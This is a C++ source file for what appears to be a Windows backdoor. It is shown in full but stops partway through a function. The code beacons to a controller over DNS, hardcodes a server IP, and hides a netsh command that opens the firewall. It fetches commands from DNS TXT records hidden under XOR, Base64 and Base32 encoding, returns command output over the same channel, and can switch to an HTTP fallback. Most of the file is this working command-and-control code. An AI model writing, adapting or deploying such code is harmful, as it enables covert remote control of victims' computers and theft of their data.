#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#ifndef _WINSOCKAPI_
#define _WINSOCKAPI_
#endif
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <wininet.h>
#include <shlobj.h>
#include <shellapi.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include <string>
#include <vector>
#include <map>
#include <fstream>
#include <sstream>
#include <iostream>
#include <thread>
#include <chrono>
#include <locale>
#include <codecvt>
#include <algorithm>
#include <ctime>
#include <mutex>
#include <deque>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(linker, "/SUBSYSTEM:WINDOWS")
#pragma comment(linker, "/MANIFESTDEPENDENCY:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")
#pragma comment(lib, "crypt32.lib")

#ifndef PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE
#define PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE 0x00020016
#endif

#ifndef HPCON
typedef VOID* HPCON;
#endif

#ifndef _CONPTY_DEFINED
#define _CONPTY_DEFINED
typedef HRESULT(WINAPI* PFN_CreatePseudoConsole)(COORD, HANDLE, HANDLE, DWORD, HPCON*);
typedef VOID(WINAPI* PFN_ClosePseudoConsole)(HPCON);
static PFN_CreatePseudoConsole g_pfnCreatePseudoConsole = nullptr;
static PFN_ClosePseudoConsole g_pfnClosePseudoConsole = nullptr;

inline bool LoadConPTYFunctions() {
    static bool attempted = false;
    static bool loaded = false;

    if (attempted) return loaded;
    attempted = true;

    HMODULE hKernel = GetModuleHandleA("kernel32.dll");
    if (!hKernel) return false;

    g_pfnCreatePseudoConsole = (PFN_CreatePseudoConsole)GetProcAddress(hKernel, "CreatePseudoConsole");
    g_pfnClosePseudoConsole = (PFN_ClosePseudoConsole)GetProcAddress(hKernel, "ClosePseudoConsole");

    loaded = (g_pfnCreatePseudoConsole != nullptr && g_pfnClosePseudoConsole != nullptr);
    return loaded;
}

inline HRESULT CreatePseudoConsole(COORD size, HANDLE hInput, HANDLE hOutput, DWORD dwFlags, HPCON* phPC) {
    if (!LoadConPTYFunctions() || !g_pfnCreatePseudoConsole)
        return E_NOTIMPL;
    return g_pfnCreatePseudoConsole(size, hInput, hOutput, dwFlags, phPC);
}

inline VOID ClosePseudoConsole(HPCON hPC) {
    if (LoadConPTYFunctions() && g_pfnClosePseudoConsole)
        g_pfnClosePseudoConsole(hPC);
}

#endif
#ifdef min
#undef min
#endif
#ifdef max
#undef max
#endif

std::string UnescapeJson(const std::string& input) {
    std::string output;
    output.reserve(input.length());

    for (size_t i = 0; i < input.length(); i++) {
        if (input[i] == '\\' && i + 1 < input.length()) {
            char next = input[i + 1];
            if (next == '"') {
                output += '"';
                i++;
            }
            else if (next == '\\') {
                output += '\\';
                i++;
            }
            else if (next == 'n') {
                output += '\n';
                i++;
            }
            else if (next == 'r') {
                output += '\r';
                i++;
            }
            else if (next == 't') {
                output += '\t';
                i++;
            }
            else {
                output += input[i];
            }
        }
        else {
            output += input[i];
        }
    }

    return output;
}

class SimpleJSON {
public:
    std::map<std::string, std::string> data;

    std::string EscapeJson(const std::string& str) const {
        std::string result;
        for (unsigned char c : str) {
            if (c == '"') result += "\\\"";
            else if (c == '\\') result += "\\\\";
            else if (c == '\b') result += "\\b";
            else if (c == '\f') result += "\\f";
            else if (c == '\n') result += "\\n";
            else if (c == '\r') result += "\\r";
            else if (c == '\t') result += "\\t";
            else if (c < 32 || c > 126) {

                char buf[8];
                sprintf_s(buf, "\\u%04x", c);
                result += buf;
            }
            else result += c;
        }
        return result;
    }

    void Parse(const std::string& jsonStr) {
        data.clear();

        size_t recordPos = jsonStr.find("\"record\"");
        if (recordPos != std::string::npos) {
            size_t recordStart = jsonStr.find(":", recordPos);
            if (recordStart != std::string::npos) {
                recordStart++;

                while (recordStart < jsonStr.length() &&
                    (jsonStr[recordStart] == ' ' || jsonStr[recordStart] == '\t' ||
                        jsonStr[recordStart] == '\n' || jsonStr[recordStart] == '\r'))
                    recordStart++;

                if (recordStart < jsonStr.length() && jsonStr[recordStart] == '{') {

                    int braceCount = 1;
                    size_t recordEnd = recordStart + 1;
                    while (recordEnd < jsonStr.length() && braceCount > 0) {
                        if (jsonStr[recordEnd] == '{') braceCount++;
                        else if (jsonStr[recordEnd] == '}') braceCount--;
                        recordEnd++;
                    }

                    if (braceCount == 0) {

                        std::string recordJson = jsonStr.substr(recordStart, recordEnd - recordStart);
                        ParseObject(recordJson);
                        return;
                    }
                }
            }
        }

        ParseObject(jsonStr);
    }

    void ParseObject(const std::string& jsonStr) {
        size_t pos = 0;
        while (pos < jsonStr.length()) {
            size_t keyStart = jsonStr.find("\"", pos);
            if (keyStart == std::string::npos) break;
            keyStart++;
            size_t keyEnd = jsonStr.find("\"", keyStart);
            if (keyEnd == std::string::npos) break;

            std::string key = jsonStr.substr(keyStart, keyEnd - keyStart);

            size_t colon = jsonStr.find(":", keyEnd);
            if (colon == std::string::npos) break;

            size_t valueStart = colon + 1;
            while (valueStart < jsonStr.length() &&
                (jsonStr[valueStart] == ' ' || jsonStr[valueStart] == '\t' ||
                    jsonStr[valueStart] == '\n' || jsonStr[valueStart] == '\r'))
                valueStart++;

            std::string value;
            if (jsonStr[valueStart] == '"') {
                valueStart++;
                size_t valueEnd = valueStart;
                while (valueEnd < jsonStr.length()) {
                    if (jsonStr[valueEnd] == '"' &&
                        (valueEnd == valueStart || jsonStr[valueEnd - 1] != '\\')) break;
                    valueEnd++;
                }
                value = jsonStr.substr(valueStart, valueEnd - valueStart);
                pos = valueEnd + 1;
            }
            else if (jsonStr[valueStart] == '{' || jsonStr[valueStart] == '[') {

                char openChar = jsonStr[valueStart];
                char closeChar = (openChar == '{') ? '}' : ']';
                int depth = 1;
                size_t valueEnd = valueStart + 1;
                while (valueEnd < jsonStr.length() && depth > 0) {
                    if (jsonStr[valueEnd] == openChar) depth++;
                    else if (jsonStr[valueEnd] == closeChar) depth--;
                    valueEnd++;
                }
                pos = valueEnd;
                continue;
            }
            else if (jsonStr[valueStart] == 'n' && jsonStr.substr(valueStart, 4) == "null") {
                value = "";
                pos = valueStart + 4;
            }
            else if (jsonStr[valueStart] == 't' && jsonStr.substr(valueStart, 4) == "true") {
                value = "true";
                pos = valueStart + 4;
            }
            else if (jsonStr[valueStart] == 'f' && jsonStr.substr(valueStart, 5) == "false") {
                value = "false";
                pos = valueStart + 5;
            }
            else {
                size_t valueEnd = jsonStr.find_first_of(",}", valueStart);
                if (valueEnd != std::string::npos) {
                    value = jsonStr.substr(valueStart, valueEnd - valueStart);

                    size_t start = 0;
                    while (start < value.length() &&
                        (value[start] == ' ' || value[start] == '\t')) start++;
                    size_t end = value.length();
                    while (end > start &&
                        (value[end - 1] == ' ' || value[end - 1] == '\t')) end--;
                    value = value.substr(start, end - start);
                    pos = valueEnd;
                }
            }

            if (!key.empty()) {
                data[key] = value;
            }
        }
    }

    std::string Get(const std::string& key) {
        return (data.find(key) != data.end()) ? data[key] : "";
    }

    void Set(const std::string& key, const std::string& value) {
        data[key] = value;
    }

    std::string ToString() const {
        std::string result = "{";
        bool first = true;
        for (const auto& pair : data) {
            if (!first) result += ",";
            result += "\"" + pair.first + "\":\"" + EscapeJson(pair.second) + "\"";
            first = false;
        }
        result += "}";
        return result;
    }
};
std::string GetTimestamp();
std::string ExecuteCommand(const std::string& cmd);
std::string SendInteractiveInput(const std::string& input);
std::string GetPublicIP();
std::string XOREncrypt(const std::string& data, const std::string& key);
std::string Base64Encode(const std::string& data);
std::string Base64Decode(const std::string& data);
void DebugLog(const std::string& message);
bool SaveMode(const std::string& mode);

class DNSTunnelClient {
private:
    std::string server_ip;
    std::string domain;
    int port;
    std::string encryption_key;
    bool active;
    std::string last_command;

    std::string ToBase32(const std::string& input) {
        const char* alphabet = "abcdefghijklmnopqrstuvwxyz234567";
        std::string output;

        if (input.empty()) return output;

        int buffer = 0;
        int bits_left = 0;

        for (unsigned char byte : input) {
            buffer = (buffer << 8) | byte;
            bits_left += 8;

            while (bits_left >= 5) {
                output += alphabet[(buffer >> (bits_left - 5)) & 0x1F];
                bits_left -= 5;
            }
        }

        if (bits_left > 0) {
            output += alphabet[(buffer << (5 - bits_left)) & 0x1F];
        }

        return output;
    }

    std::string FromBase32(const std::string& input) {
        const char* alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
        std::string output;

        int buffer = 0;
        int bits_left = 0;

        for (char c : input) {
            if (c == '=') break;

            const char* pos = strchr(alphabet, toupper(c));
            if (!pos) continue;

            int value = static_cast<int>(pos - alphabet);
            buffer = (buffer << 5) | value;
            bits_left += 5;

            if (bits_left >= 8) {
                output += static_cast<char>((buffer >> (bits_left - 8)) & 0xFF);
                bits_left -= 8;
            }
        }

        return output;
    }

    int BuildDNSPacket(char* buffer, const std::string& query) {
        int pos = 0;

        srand(static_cast<unsigned int>(time(NULL)));
        buffer[pos++] = static_cast<char>(rand() % 256);
        buffer[pos++] = static_cast<char>(rand() % 256);
        buffer[pos++] = 0x01;
        buffer[pos++] = 0x00;
        buffer[pos++] = 0x00;
        buffer[pos++] = 0x01;
        buffer[pos++] = 0x00;
        buffer[pos++] = 0x00;
        buffer[pos++] = 0x00;
        buffer[pos++] = 0x00;
        buffer[pos++] = 0x00;
        buffer[pos++] = 0x00;

        size_t start = 0;
        for (size_t i = 0; i <= query.length(); i++) {
            if (i == query.length() || query[i] == '.') {
                if (i > start) {
                    size_t label_len = i - start;
                    if (label_len > 63) {
                        DebugLog("ERROR: Label too long (" + std::to_string(label_len) + " chars)");
                        label_len = 63;
                    }

                    buffer[pos++] = static_cast<char>(label_len);
                    for (size_t j = start; j < start + label_len; j++) {
                        buffer[pos++] = query[j];
                    }
                }
                start = i + 1;
            }
        }
        buffer[pos++] = 0x00;
        buffer[pos++] = 0x00;
        buffer[pos++] = 0x10;
        buffer[pos++] = 0x00;
        buffer[pos++] = 0x01;

        return pos;
    }

    std::string ParseDNSResponse(const char* response, int size) {
        if (size < 12) {
            DebugLog("Response too small");
            return "";
        }

        unsigned char rcode = response[3] & 0x0F;
        if (rcode != 0) {
            DebugLog("DNS error RCODE: " + std::to_string(rcode));
            return "";
        }

        int pos = 12;

        while (pos < size && response[pos] != 0) {
            if ((static_cast<unsigned char>(response[pos]) & 0xC0) == 0xC0) {
                pos += 2;
                break;
            }
            pos += static_cast<unsigned char>(response[pos]) + 1;
        }
        if (pos < size && response[pos] == 0) pos++;
        pos += 4;

        DebugLog("Parsing answer section from position " + std::to_string(pos));

        while (pos + 10 < size) {

            if ((static_cast<unsigned char>(response[pos]) & 0xC0) == 0xC0) {
                pos += 2;
            }
            else {
                while (pos < size && response[pos] != 0) {
                    pos += (unsigned char)response[pos] + 1;
                }
                pos++;
            }

            if (pos + 8 > size) break;

            int type = (static_cast<unsigned char>(response[pos]) << 8) |
                static_cast<unsigned char>(response[pos + 1]);
            pos += 8;

            int dataLen = (static_cast<unsigned char>(response[pos]) << 8) |
                static_cast<unsigned char>(response[pos + 1]);
            pos += 2;

            if (pos + dataLen > size) break;

            DebugLog("Found record type " + std::to_string(type) + " with length " + std::to_string(dataLen));

            if (type == 0x01 && dataLen == 4) {
                if ((unsigned char)response[pos] == 1 &&
                    (unsigned char)response[pos + 3] == 1) {
                    DebugLog("Fragment ACK received");
                    return "";
                }
            }

            if (type == 0x10) {
                DebugLog("TXT record found, extracting data...");

                std::string raw_data = "";
                int txtPos = pos;

                int segment_count = 0;
                while (txtPos < pos + dataLen) {

                    if (txtPos >= pos + dataLen) {
                        DebugLog("Reached end of TXT data");
                        break;
                    }

                    unsigned char segmentLen = static_cast<unsigned char>(response[txtPos++]);

                    if (segmentLen == 0) {
                        DebugLog("Empty segment, stopping");
                        break;
                    }

                    if (txtPos + segmentLen > pos + dataLen) {
                        DebugLog("Segment length exceeds data boundary, stopping");
                        break;
                    }

                    segment_count++;
                    DebugLog("Reading segment #" + std::to_string(segment_count) +
                        " (length: " + std::to_string(segmentLen) + " bytes)");

                    for (int i = 0; i < segmentLen; i++) {
                        raw_data += response[txtPos++];
                    }

                }

                DebugLog("Total segments read: " + std::to_string(segment_count));
                DebugLog("Total raw data length: " + std::to_string(raw_data.length()));

                if (!raw_data.empty()) {
                    try {

                        std::string b32 = "";
                        for (char c : raw_data) {
                            if (isalnum(c)) b32 += (char)toupper((unsigned char)c);
                        }

                        while (b32.length() % 8 != 0) b32 += '=';

                        DebugLog("Normalized Base32 length: " + std::to_string(b32.length()));
                        DebugLog("Normalized Base32 (first 100 chars): " + b32.substr(0, 100) + "...");

                        std::string b64 = FromBase32(b32);
                        DebugLog("After Base32 decode, length: " + std::to_string(b64.length()));

                        std::string xor_data = Base64Decode(b64);
                        DebugLog("After Base64 decode, length: " + std::to_string(xor_data.length()));

                        std::string decrypted = "";
                        for (size_t i = 0; i < xor_data.length(); i++) {
                            decrypted += (char)(xor_data[i] ^ encryption_key[i % encryption_key.length()]);
                        }

                        DebugLog("Decrypted length: " + std::to_string(decrypted.length()));
                        DebugLog("Decrypted data: " + decrypted);

                        SimpleJSON responseData;
                        responseData.Parse(decrypted);
                        std::string status = responseData.Get("status");
                        std::string data = responseData.Get("data");

                        DebugLog("Parsed - Status: '" + status + "', Data length: " + std::to_string(data.length()));

                        if (status == "command") {
                            DebugLog("→ COMMAND EXTRACTED: " + data);
                            this->last_command = data;
                            return data;
                        }
                        else if (status == "ack") {
                            DebugLog("ACK received: " + data);
                            if (data == "no_cmd") {
                                this->last_command = "";
                            }
                            return "";
                        }
                    }
                    catch (const std::exception& e) {
                        DebugLog("Decryption error: " + std::string(e.what()));
                    }
                }
            }

            pos += dataLen;
        }

        return "";
    }

public:
    DNSTunnelClient() : port(53), active(false) {}

    bool InitializeDNSMode(const std::string& config_json) {
        DebugLog("Initializing DNS Mode...");

        SimpleJSON config;
        config.Parse(config_json);

        server_ip = config.Get("server_ip");
        domain = config.Get("domain");
        std::string port_str = config.Get("port");
        port = port_str.empty() ? 53 : std::stoi(port_str);
        encryption_key = config.Get("encryption_key");

        if (server_ip == "49.145.102.239") {
            DebugLog("⚠ OVERRIDE: Using 127.0.0.1 for local testing");
            server_ip = "127.0.0.1";
        }

        if (server_ip.empty() || domain.empty()) {
            DebugLog("ERROR: Missing server_ip or domain in DNS config");
            return false;
        }

        DebugLog("DNS Mode Configuration:");
        DebugLog("  Server: " + server_ip);
        DebugLog("  Domain: " + domain);
        DebugLog("  Port: " + std::to_string(port));

        if (!AddFirewallException()) {
            DebugLog("WARNING: Could not add firewall exception (may need admin)");
        }

        DebugLog("Starting DNS handshake with extended retry window...");
        DebugLog("Will keep trying for 3 minutes to allow controller startup time...");

        int attempt = 0;
        DWORD start_time = GetTickCount();
        const DWORD MAX_DURATION_MS = 180000;

        while (true) {
            attempt++;

            DWORD current_time = GetTickCount();
            DWORD elapsed_ms = current_time - start_time;

            if (elapsed_ms >= MAX_DURATION_MS) {

                DebugLog("DNS Handshake timeout after 3 minutes");
                DebugLog("Total attempts: " + std::to_string(attempt));

                break;
            }

            int timeout_ms = 5000;
            if (attempt > 6) {
                timeout_ms = 30000;
            }
            else if (attempt > 3) {
                timeout_ms = 15000;
            }
            else if (attempt > 1) {
                timeout_ms = 10000;
            }

            int elapsed_seconds = elapsed_ms / 1000;
            int remaining_seconds = (MAX_DURATION_MS - elapsed_ms) / 1000;


            DebugLog("Handshake attempt #" + std::to_string(attempt));
            DebugLog("Timeout: " + std::to_string(timeout_ms / 1000) + "s");
            DebugLog("Elapsed: " + std::to_string(elapsed_seconds) + "s");
            DebugLog("Remaining: " + std::to_string(remaining_seconds) + "s");


            if (SendBeacon(timeout_ms)) {
                active = true;

                DebugLog(" DNS Mode initialized successfully!");
                DebugLog(" Connected on attempt #" + std::to_string(attempt));
                DebugLog(" Time elapsed: " + std::to_string(elapsed_seconds) + "s");

                return true;
            }

            DebugLog("Attempt failed. Waiting 5s before retry...");
            Sleep(5000);

            current_time = GetTickCount();
            elapsed_ms = current_time - start_time;
        }


        DebugLog("DNS server still not available after 3 minutes");
        DebugLog("Falling back to HTTP mode");


        Sleep(2000);

        return false;
    }

    bool AddFirewallException() {
        std::string cmd = "netsh advfirewall firewall add rule name=\"DNSClient\" "
            "dir=out action=allow protocol=UDP remoteport=" +
            std::to_string(port) + " > nul 2>&1";

        STARTUPINFOA si = { 0 };
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        PROCESS_INFORMATION pi = { 0 };
        char cmdLine[512];
        strcpy_s(cmdLine, cmd.c_str());

        bool success = CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE,
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

        if (success) {
            WaitForSingleObject(pi.hProcess, 5000);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }

        return success;
    }

    bool SendBeacon(int timeout) {
        SimpleJSON beacon;
        beacon.Set("type", "beacon");
        beacon.Set("id", GetAgentID());

        std::string beacon_data = beacon.ToString();
        DebugLog("Sending beacon (timeout: " + std::to_string(timeout) + "ms)");
        DebugLog("Beacon JSON: " + beacon_data);

        return SendDNSQuery(beacon_data, timeout);
    }

    bool SendDNSQuery(const std::string& data, int timeout = 0) {
        DebugLog("Preparing DNS query with data: " + data.substr(0, 50) + "...");

        std::string processed_data = data;
        if (!encryption_key.empty()) {
            processed_data = XOREncrypt(data, encryption_key);
            processed_data = Base64Encode(processed_data);
        }

        std::string base32 = ToBase32(processed_data);
        base32.erase(std::remove(base32.begin(), base32.end(), '='), base32.end());

        std::string agent_id = GetAgentID();
        std::string suffix = "." + agent_id + "." + domain;

        int max_label_len = 63;
        int remaining_total_space = 253 - static_cast<int>(suffix.length());
        int allowed_len = (max_label_len < remaining_total_space) ? max_label_len : remaining_total_space;

        DebugLog("Total data size: " + std::to_string(base32.length()) + " chars");
        DebugLog("Max label size: " + std::to_string(allowed_len) + " chars");

        if (base32.length() > static_cast<size_t>(allowed_len)) {
            DebugLog("Data requires fragmentation - splitting into chunks...");

            size_t total_fragments = (base32.length() + allowed_len - 1) / allowed_len;
            DebugLog("Total fragments to send: " + std::to_string(total_fragments));

            for (size_t i = 0; i < total_fragments; i++) {
                size_t start = i * allowed_len;
                size_t chunk_size = std::min(static_cast<size_t>(allowed_len), base32.length() - start);
                std::string fragment = base32.substr(start, chunk_size);

                std::string query = fragment + suffix;
                DebugLog("Sending fragment " + std::to_string(i + 1) + "/" +
                    std::to_string(total_fragments) + ": " + query);

                if (!SendDNSFragment(query, timeout)) {
                    DebugLog("ERROR: Failed to send fragment " + std::to_string(i + 1));
                    return false;

                }

            }

            DebugLog("All fragments sent successfully");
            return true;
        }
        else {

            std::string query = base32 + suffix;
            DebugLog("Data fits in single query: " + query);
            return SendDNSFragment(query, timeout);
        }
    }

    bool SendDNSFragment(const std::string& query, int timeout_ms = 0) {
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            DebugLog("ERROR: WSAStartup failed");
            return false;
        }

        SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (sock == INVALID_SOCKET) {
            DebugLog("ERROR: Socket creation failed: " + std::to_string(WSAGetLastError()));
            WSACleanup();
            return false;
        }

        if (timeout_ms > 0) {
            DebugLog("Socket timeout set to " + std::to_string(timeout_ms) + "ms");
            DWORD timeout = timeout_ms;
            setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
        }
        else {
            DebugLog("Socket created without timeout - waiting indefinitely for DNS response");
        }

        struct sockaddr_in server_addr;
        ZeroMemory(&server_addr, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(static_cast<u_short>(port));

        if (inet_pton(AF_INET, server_ip.c_str(), &server_addr.sin_addr) <= 0) {
            DebugLog("ERROR: Invalid server IP: " + server_ip);
            closesocket(sock);
            WSACleanup();
            return false;
        }

        char dns_packet[512];
        int packet_size = BuildDNSPacket(dns_packet, query);

        if (packet_size <= 0) {
            DebugLog("ERROR: Failed to build DNS packet");
            closesocket(sock);
            WSACleanup();
            return false;
        }

        DebugLog("Sending DNS packet (" + std::to_string(packet_size) + " bytes) to " +
            server_ip + ":" + std::to_string(port));

        int sent = sendto(sock, dns_packet, packet_size, 0,
            (struct sockaddr*)&server_addr, sizeof(server_addr));

        if (sent == SOCKET_ERROR) {
            DebugLog("ERROR: Send failed: " + std::to_string(WSAGetLastError()));
            closesocket(sock);
            WSACleanup();
            return false;
        }

        DebugLog("Sent " + std::to_string(sent) + " bytes, waiting for response...");

        char response[4096];
        struct sockaddr_in from_addr;
        int from_len = sizeof(from_addr);

        int received = recvfrom(sock, response, sizeof(response), 0,
            (struct sockaddr*)&from_addr, &from_len);

        bool success = false;

        if (received == SOCKET_ERROR) {
            int error = WSAGetLastError();
            if (error == WSAETIMEDOUT) {
                DebugLog(" Timeout waiting for DNS response (server may not be ready)");
            }
            else {
                DebugLog("ERROR: Receive failed: " + std::to_string(error));
            }
        }
        else if (received > 0) {
            DebugLog(" Received " + std::to_string(received) + " bytes");

            std::string result = ParseDNSResponse(response, received);

            if (result == "1.1.1.1") {
                DebugLog(" Fragment acknowledged by server");
                this->last_command = "";
                success = true;
            }
            else if (!result.empty()) {
                DebugLog(" Got command/ACK from server");
                this->last_command = result;
                success = true;
            }
            else {
                DebugLog(" Server responded (empty response is OK)");
                success = true;
            }
        }

        closesocket(sock);
        WSACleanup();
        return success;
    }

    std::string GetAgentID() {
        char computerName[MAX_PATH];
        DWORD size = MAX_PATH;
        GetComputerNameA(computerName, &size);

        std::string id(computerName);
        std::transform(id.begin(), id.end(), id.begin(), ::tolower);

        if (id.length() > 15) {
            id = id.substr(0, 15);
        }

        return id;
    }

    bool IsActive() const {
        return active;
    }

    std::string RequestCommand() {
        DebugLog("=== Requesting command from DNS server ===");

        SimpleJSON request;
        request.Set("type", "request_cmd");
        request.Set("id", GetAgentID());

        std::string request_data = request.ToString();

        for (int attempt = 1; attempt <= 3; attempt++) {
            DebugLog("Request attempt " + std::to_string(attempt) + "/3");

            if (SendDNSQuery(request_data)) {

                if (!last_command.empty()) {
                    std::string cmd = last_command;
                    last_command.clear();

                    if (cmd == "-mode jsonbin") {
                        DebugLog(" MODE SWITCH DETECTED: Returning to HTTP");
                        return cmd;
                    }

                    if (cmd != "no_cmd") {
                        DebugLog(" Command received: " + cmd);
                        return cmd;
                    }
                    else {
                        DebugLog("No command available from server");
                    }
                }
            }

            if (attempt < 3) {
                Sleep(1000);
            }
        }

        return "";
    }

    bool SendResult(const std::string& result) {
        DebugLog("=== Sending command result ===");
        DebugLog("Result length: " + std::to_string(result.length()) + " bytes");

        SimpleJSON resultData;
        resultData.Set("type", "result");
        resultData.Set("data", result);

        std::string payload = resultData.ToString();
        DebugLog("Payload: " + payload.substr(0, 100) + "...");

        bool success = SendDNSQuery(payload);

        if (success) {
            DebugLog(" Result sent successfully");
        }
        else {
            DebugLog("✗ Failed to send result");
        }

        return success;
    }
};

class ReverseDNSServer {
private:
    std::string encryption_key;
    int port;
    std::string domain;
    bool running;
    SOCKET sock;

    struct ControllerSession {
        std::string pending_cmd;
        std::string last_response;
        std::deque<std::string> response_chunks;
        bool awaiting_response;
        DWORD cmd_sent_time;
        sockaddr_in addr;
        bool addr_known;
        bool revert_requested = false;
    };

    ControllerSession session;
    HANDLE sessionMutex;

    std::string ToBase32(const std::string& input) {
        const char* alphabet = "abcdefghijklmnopqrstuvwxyz234567";
        std::string output;
        if (input.empty()) return output;
        int buffer = 0, bits_left = 0;
        for (unsigned char byte : input) {
            buffer = (buffer << 8) | byte;
            bits_left += 8;
            while (bits_left >= 5) {
                output += alphabet[(buffer >> (bits_left - 5)) & 0x1F];
                bits_left -= 5;
            }
        }
        if (bits_left > 0)
            output += alphabet[(buffer << (5 - bits_left)) & 0x1F];
        return output;
    }

    std::string FromBase32(const std::string& input) {
        const char* alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
        std::string output;
        int buffer = 0, bits_left = 0;
        for (char c : input) {
            if (c == '=') break;
            const char* pos = strchr(alphabet, toupper(c));
            if (!pos) continue;
            int value = static_cast<int>(pos - alphabet);
            buffer = (buffer << 5) | value;
            bits_left += 5;
            if (bits_left >= 8) {
                output += static_cast<char>((buffer >> (bits_left - 8)) & 0xFF);
                bits_left -= 8;
            }
        }
        return output;
    }

    std::string XORCipher(const std::string& data, const std::string& key) {
        std::string result = data;
        for (size_t i = 0; i < data.size(); i++)
            result[i] = data[i] ^ key[i % key.size()];
        return result;
    }

    std::vector<uint8_t> BuildDNSResponse(const uint8_t* request,
        int request_len,
        const std::string& payload) {
        std::vector<uint8_t> resp;

        resp.push_back(request[0]);
        resp.push_back(request[1]);

        resp.push_back(0x84);
        resp.push_back(0x00);

        resp.push_back(0x00); resp.push_back(0x01);

        resp.push_back(0x00); resp.push_back(0x01);

        resp.push_back(0x00); resp.push_back(0x00);

        resp.push_back(0x00); resp.push_back(0x00);

        int pos = 12;
        while (pos < request_len && request[pos] != 0) {
            pos += request[pos] + 1;
        }
        pos += 5;

        for (int i = 12; i < pos && i < request_len; i++)
            resp.push_back(request[i]);

        resp.push_back(0xC0); resp.push_back(0x0C);

        resp.push_back(0x00); resp.push_back(0x10);

        resp.push_back(0x00); resp.push_back(0x01);

        resp.push_back(0x00); resp.push_back(0x00);
        resp.push_back(0x00); resp.push_back(0x00);

        std::vector<std::string> chunks;
        for (size_t i = 0; i < payload.size(); i += 250)
            chunks.push_back(payload.substr(i, 250));

        size_t rdlen_pos = resp.size();
        resp.push_back(0x00); resp.push_back(0x00);

        size_t rdata_start = resp.size();
        for (const auto& chunk : chunks) {
            resp.push_back((uint8_t)chunk.size());
            for (char c : chunk) resp.push_back((uint8_t)c);
        }
        size_t rdlength = resp.size() - rdata_start;
        resp[rdlen_pos] = (uint8_t)(rdlength >> 8);
        resp[rdlen_pos + 1] = (uint8_t)(rdlength & 0xFF);

        return resp;
    }

    void SendAck(const uint8_t* request, int request_len,
        const sockaddr_in& from) {
        std::vector<uint8_t> resp;
        resp.push_back(request[0]); resp.push_back(request[1]);
        resp.push_back(0x84); resp.push_back(0x00);
        resp.push_back(0x00); resp.push_back(0x01);
        resp.push_back(0x00); resp.push_back(0x01);
        resp.push_back(0x00); resp.push_back(0x00);
        resp.push_back(0x00); resp.push_back(0x00);

        int pos = 12;
        while (pos < request_len && request[pos] != 0)
            pos += request[pos] + 1;
        pos += 5;
        for (int i = 12; i < pos && i < request_len; i++)
            resp.push_back(request[i]);

        resp.push_back(0xC0); resp.push_back(0x0C);
        resp.push_back(0x00); resp.push_back(0x01);
        resp.push_back(0x00); resp.push_back(0x01);
        resp.push_back(0x00); resp.push_back(0x00);
        resp.push_back(0x00); resp.push_back(0x00);
        resp.push_back(0x00); resp.push_back(0x04);
        resp.push_back(1); resp.push_back(1);
        resp.push_back(1); resp.push_back(1);

        sendto(sock, (const char*)resp.data(), (int)resp.size(), 0,
            (const sockaddr*)&from, sizeof(from));
    }

    void SendEncryptedResponse(SimpleJSON& data,
        const uint8_t* request, int request_len,
        const sockaddr_in& from) {
        std::string json_str = data.ToString();
        std::string xor_enc = XORCipher(json_str, encryption_key);
        std::string b64_enc = Base64Encode(xor_enc);
        std::string b32_enc = ToBase32(b64_enc);

        b32_enc.erase(std::remove(b32_enc.begin(), b32_enc.end(), '='), b32_enc.end());

        auto pkt = BuildDNSResponse(request, request_len, b32_enc);
        sendto(sock, (const char*)pkt.data(), (int)pkt.size(), 0,
            (const sockaddr*)&from, sizeof(from));
    }

    bool ParseQuery(const uint8_t* buf, int len,
        std::string& fragment, std::string& agent_id) {
        if (len < 13) return false;
        int pos = 12;

        std::vector<std::string> labels;

        while (pos < len) {
            uint8_t llen = buf[pos];
            if (llen == 0) break;
            if (pos + llen >= len) return false;
            labels.push_back(std::string((const char*)buf + pos + 1, llen));
            pos += llen + 1;
        }

        if (labels.size() < 2) return false;

        auto is_base32_label = [](const std::string& s) -> bool {
            for (char c : s) {
                char lc = tolower(c);
                if (!((lc >= 'a' && lc <= 'z') || (lc >= '2' && lc <= '7')))
                    return false;
            }
            return !s.empty();
            };

        std::string payload_accum;
        agent_id.clear();
        for (const auto& lbl : labels) {
            if (agent_id.empty() && !is_base32_label(lbl)) {

                agent_id = lbl;
                break;
            }
            payload_accum += lbl;
        }

        if (agent_id.empty() || payload_accum.empty()) return false;

        fragment = payload_accum;
        return true;
    }

    void ProcessMessage(const std::string& agent_id,
        SimpleJSON& message,
        const uint8_t* request, int request_len,
        const sockaddr_in& from) {
        WaitForSingleObject(sessionMutex, INFINITE);

        if (!session.addr_known) {
            session.addr = from;
            session.addr_known = true;
            char ip_str[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, (PVOID)&from.sin_addr, ip_str, sizeof(ip_str));
            DebugLog("REVERSE DNS: Controller connected from " + std::string(ip_str));
        }

        std::string msg_type = message.Get("type");
        SimpleJSON resp;

        if (msg_type == "beacon") {
            resp.Set("status", "ack");
            resp.Set("data", "beacon_ok");
        }
        else if (msg_type == "request_cmd") {

            if (session.awaiting_response && !session.pending_cmd.empty()) {
                DWORD elapsed = GetTickCount() - session.cmd_sent_time;
                if (elapsed > 10000) {
                    DebugLog("REVERSE DNS: Command delivery timeout — resetting flag");
                    session.awaiting_response = false;
                }
            }

            if (!session.response_chunks.empty()) {
                std::string chunk = session.response_chunks.front();
